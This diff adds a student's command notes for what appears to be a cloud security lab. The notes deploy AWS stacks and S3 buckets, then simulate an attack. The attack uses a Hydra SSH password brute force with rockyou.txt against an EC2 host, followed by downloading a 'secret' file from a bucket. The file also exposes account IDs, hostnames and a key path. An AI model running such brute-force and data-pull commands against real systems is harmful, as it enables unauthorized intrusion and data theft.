@@ -1,0 +1,34 @@
+
+aws cloudformation create-stack --region us-east-1 --stack-name c3-s3 --template-body file://starter/c3-s3.yml
+
+aws cloudformation create-stack --region us-east-1 --stack-name c3-vpc --template-body file://starter/c3-vpc.yml
+
+aws cloudformation create-stack --region us-east-1 --stack-name c3-app --template-body file://starter/c3-app.yml --parameters ParameterKey=KeyPair,ParameterValue=duylk --capabilities CAPABILITY_IAM
+
+
+
+aws s3 cp free_recipe.txt s3://cand-c3-free-recipes-720240617631/ --region us-east-1
+aws s3 cp secret_recipe.txt s3://cand-c3-secret-recipes-720240617631/ --region us-east-1
+
+Test
+http://c1-web-service-alb-1147330877.us-east-1.elb.amazonaws.com/free_recipe
+
+Ex3:
+
+ssh -i "C:\Users\leduy\.ssh\duylk.pem" ubuntu@ec2-54-146-194-51.compute-1.amazonaws.com
+
+hydra -l ubuntu -P rockyou.txt ssh://ec2-54-237-165-81.compute-1.amazonaws.com
+
+# view the files in the secret recipes bucket
+aws s3 ls  s3://cand-c3-secret-recipes-720240617631/ --region us-east-1
+ 
+# download the files
+aws s3 cp s3://cand-c3-secret-recipes-720240617631/secret_recipe.txt  .  --region us-east-1
+
+# view contents of the file
+cat secret_recipe.txt
+
+Ex4
+ssh -i "C:\Users\leduy\.ssh\duylk.pem" ubuntu@ec2-54-237-165-81.compute-1.amazonaws.com
+sudo vi /etc/ssh/sshd_config
+sudo service ssh restart
